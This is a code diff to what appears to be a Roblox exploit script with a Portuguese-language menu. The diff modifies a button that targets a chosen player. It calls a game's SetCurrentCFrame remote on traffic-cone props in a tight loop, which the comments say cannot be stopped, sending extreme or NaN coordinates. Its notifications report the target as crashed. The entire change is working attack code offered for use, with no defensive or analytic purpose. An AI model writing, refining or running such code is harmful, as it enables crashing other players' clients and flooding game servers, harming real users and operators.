@@ -520,12 +520,13 @@ MainTab:Button({
                 
                 if trafficCones then
                     WindUI:Notify({
-                        Title = "🌀 Ataque Iniciado", 
-                        Content = "Injetando coordenadas nulas de crash em " .. targetPlayer.Name, 
+                        Title = "🌀 Ataque de Arrasto Iniciado", 
+                        Content = "Puxando " .. targetPlayer.Name .. " para a zona de colapso físico...", 
                         Duration = 3
                     })
 
                     task.spawn(function()
+                        -- Loop persistente e sem botão de parar
                         while targetPlayer and targetPlayer.Parent == game:GetService("Players") and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") do
                             local props = trafficCones:GetChildren()
                             if #props > 0 then
@@ -533,23 +534,24 @@ MainTab:Button({
                                     local setCFrameRemote = prop:FindFirstChild("SetCurrentCFrame")
                                     if setCFrameRemote and setCFrameRemote:IsA("RemoteFunction") then
                                         
-                                        -- Aplica a posição NaN (Not a Number) para travar o motor de renderização
-                                        local nanCFrame = CFrame.new(0/0, 0/0, 0/0)
+                                        -- Coordenada de Limite Absoluto (Infinito Exponencial)
+                                        -- Força o teletransporte físico por sobreposição contínua
+                                        local crashCFrame = CFrame.new(1e308, 1e308, 1e308)
                                         
                                         task.spawn(function()
                                             pcall(function()
-                                                setCFrameRemote:InvokeServer(nanCFrame)
+                                                setCFrameRemote:InvokeServer(crashCFrame)
                                             end)
                                         end)
                                     end
                                 end
                             end
-                            task.wait(0.05) -- Cadência ideal para bombardear a fila de rede do servidor
+                            task.wait(0.01) -- Velocidade máxima de atualização para não dar chance de fuga
                         end
                         
                         WindUI:Notify({
-                            Title = "✅ Alvo Removido", 
-                            Content = "O jogador desconectou ou o loop de ataque encerrou.", 
+                            Title = "✅ Alvo Desconectado", 
+                            Content = "O jogador sumiu do servidor (Client Crashed).", 
                             Duration = 5
                         })
                     end)
